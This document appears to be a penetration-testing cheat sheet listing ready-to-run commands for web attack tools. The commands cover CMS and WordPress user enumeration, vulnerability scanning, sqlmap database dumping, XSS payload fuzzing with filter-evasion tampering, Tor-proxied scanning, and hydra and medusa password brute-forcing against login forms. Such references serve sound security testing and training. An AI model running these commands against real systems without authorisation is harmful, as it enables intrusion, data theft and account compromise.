WEB APPLICATION EXPLOIT TOOLS

ENUMERATION
	CMS IDENTIFICATION
blindelephant -u
blindelephant -n 50 http://10.11.1.8/ guess
	-attempts to discover version of (known) web application(s)
plecost -i /usr/share/plecost/wp_plugin_list.txt -t 20 -o results.txt http://127.0.0.1/

VULNERABILITY SCANNERS
nikto
	apt-get install nikto
nikto -h http://127.0.0.1/
	--change useragent in nikto.conf for stealth
nikto -h https://127.0.0.1/ -c all | tee nitko.txt
	--brute force all
joomscan -u http://127.0.0.1/
0d1n
	https://github.com/CoolerVoid/0d1n
0d1n --host 'http://target/dom/find?search=*&type=^' --payloads payloads/xss-rsnake.txt -find_string_list response2find/find.txt  --log out_data22 --tamper encode64,randcase,urlencode,double_urlencode,spaces2comment,unmagicquote,apostrophe2nullencode,rand_comment,rand_space,replace_keywords --threads 8
	--brute path and tamper payloads
0d1n --host 'https://target.dom/^' --payloads test_list1 --find_string_list find_list_one --log out_data27
	--brute GET and find string
0d1n --host https://page/test.php --post 'csrf={token}&pass=^' --payloads payloads/xss.txt --find_string_list payloads/xss.txt --token_name name_token_field --log logtest --save_response --proxy http://127.0.0.1:8080/
	--search XSS and pass anti-csrf token, proxy through burp
grabber http://127.0.0.1/index.html
skipfish -W wordlist -o /output/dir http://127.0.0.1/
cadaver
davtest -url http://127.0.0.1/
deblaze --help
dotdotpwn -m http -h 10.11.1.1 -M GET
	-directory traversal vulnerability fuzzer
fimap -u 'http://127.0.0.1/'
fimap -m -l 'urllist.txt'
padbuster http://127.0.0.1/ EncryptedSample Blocksize
retire
	-search web applications for depricated javascript library implementations with known vulnerabilities
uniscan-gui
w3af
w3af-gui
WAScan
	https://github.com/m4ll0k/WAScan
python wascan.py --url https://target.dom/ --scan 0
	--fingerprint
python wascan.py --url https://target.dom/index.php?id=1 --scan 1
	--attack
python wascan.py --url https://target.dom/ --scan 2
	--audit
python wascan.py --url https://target.dom/ --scan 3
	--brute force
python wascan.py --url https://target.dom/ --scan 4
	--information disclosure
python wascan.py --url https://target.dom --scan 5
	--full scan
python wascan.py --url https://target.dom/seek.php --brute
	--brute force hidden parameters
python wascan.py --url https://target.dom/test --scan 5 --data "id=1" --method POST
python wascan.py --url https://target.dom/test --scan 5 --auth "admin:1234" --proxy 127.0.0.1 --proxy-auth "root:4321" --ragent -v
wapiti http://127.0.0.1/
webshag-cli -U
webshag-cli -m pscan 127.0.0.1
webshag-cli -m uscan 127.0.0.1
webshag-cli -m info 127.0.0.1
whatweb -v http://127.0.0.1/

CMS Scanners:
	Wordpress:
		https://wpvulndb.com/
		https://wpvulndb.com/api
WPScan
	https://github.com/wpscanteam/wpscan
	apt-get install wpscan (Kali Linux)
	gem install wpscan
	--DB is located at ~/.wpscan/db
	--config files:
		~/.wpscan/cli_options.json
		~/.wpscan/cli_options.yml
wpscan --update
wpscan --url http://127.0.0.1/
	--scan vulnerabilities
wpscan -v --proxy https://127.0.0.1:8080 --url https://target.dom/
	--proxy wpscan via burp
wpscan -v --proxy socks5://127.0.0.1:9090 --url https://target.dom/
	--proxy wpscan via tor
wpscan -u https://target.dom/ --enumerate -a --plugins-detection
	--enumarate all, plugin detection is default passive
wpscan -u http://127.0.0.1/ --enumerate u
	--enumerate users
wpscan --url https://target.dom/ --enumerate u1-100
	--enumerate range of usernames
wpscan -u https://target.dom/ --enumerate p
	--enumerate installed plugins
wpscan -u https://target.dom/ --enumerate t
	--enumerate installed themes
wpscan -u https://target.dom/ --enumerate tt
	--enumerate installed timethumbs
WPScan (via Docker)
	docker pull wpscanteam/wpscan
docker run -it --rm wpscanteam/wpscan --url https://target.dom/ --enumerate u
	--enumerate usernames
docker run -it --rm wpscanteam/wpscan --url https://target.dom/ --enumerate u1-100
	--enumerate range of usernames
WPSeku
	https://github.com/m4ll0k/WPSeku
python3 wpseku.py --url https://target.dom --verbose
	--generic scan
python3 wpseku.py --url https://target.dom --brute --user target --wordlist word.lst --verbose
	--brute force
python3 wpseku.py --scan <dir/file> --verbose
	--scan plugin, theme and wordpress code

WEB DATABASES
sqlmap -u "http://127.0.0.1/?id=1&str=val"
	-GET request
sqlmap -u "http://127.0.0.1/" --data="id=1&str=val"
	-POST request
sqlmap -u "http://127.0.0.1/index.php" --crawl 
sqlmap -u ''http://127.0.0.1/'' --data=''id=l&str=val'' -p ''id'' -b --dbms=" mssqllmysqlloraclelpostgres "
	-sqlmap against parameter id specifying db type
sqlmap -u ''http://127.0.0.1/'' --data=''id=l&str=val'' -p ''id'' --cookie=''cookiel=vall;cookie2=val2''
sqlmap -u "http://127.0.0.1/index.php?p=1&h=something" --dbs (--dump-all)
sqlninja -m t/f/b/e/x/u/s/k/r/d/i/m -f /root/sqlninja.conf
	locate sqlninja-howto.html
jsql
sqlsus -g sqlsus.cfg
sqlsus sqlsus.cfg
sqlsus> start

IDS/IPS Identification
ua-tester -u http://127.0.0.1/ -v
	test lists of user agent strings on target web host

WEB CRAWLERS
apache-users -h https://10.11.1.223/ -l users -s 0 -e 403 -t 20
cutycapt --url=http://127.0.0.1/ --out=file.png
	-display image of webkit display
dirb http://127.0.0.1/
dirb http://127.0.0.1/ -X .html
dirb http://127.0.0.1/ /usr/share/dirb/wordlists/vulns/apache.txt
dirbuster
parsero -u http://127.0.0.1/ -sb
	-robots.txt audit
webshag-cli -m spider 127.0.0.1

Web Application Proxies
fl-record -p 9090
fl-record foo_bar
fl-run-test -dV test_FooBar.py

FRAMEWORK/GUI WEB APPLICATION FUZZERS/SPIDERS/PROXIES/SCANNERS
burpsuite
owasp-zap
paros
powerfuzzer
proxystrike
vega
webscarab
webshag-cli -m fuzz 127.0.0.1 -n gen -e 11 -o txt
webshag-gui
webslayer
websploit
wfuzz

WEB APPLICATION EXPLOITATION
bbqsql
jboss-win 192.168.1.2 8080
jboss-linux 192.168.1.2 80
phpsploit
websploit
xsser


cewl -w cewl"$1" -d 9 -m 5 "$1" -w cewl.txt
	#create a dictionary list from website(-w) recurring over (-d) number of pages for all words length (-m) or greater	
john --wordlist=cewl.txt --rules --stdout > cewl-mangled
cat cewl-mangled | wc -l
medusa -h admin.megacorpone.com -u admin -P cewl-mangled -M http -n 81 -m DIR:/admin -T 30
hydra -l username -P rockyou.txt website.dom http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:S=302"
	--http form post success response code
hydra -l username -P rockyou.txt website.dom http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:invalid."
	--http form post non-error(200) response
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns  -F  -u  -t 1  -w 10  -v  -V  target.dom  http-get-form "/path/to/target.cgi:username=^USER^&password=^PASS^&Login=Login:S=Welcome"
	--http form get success response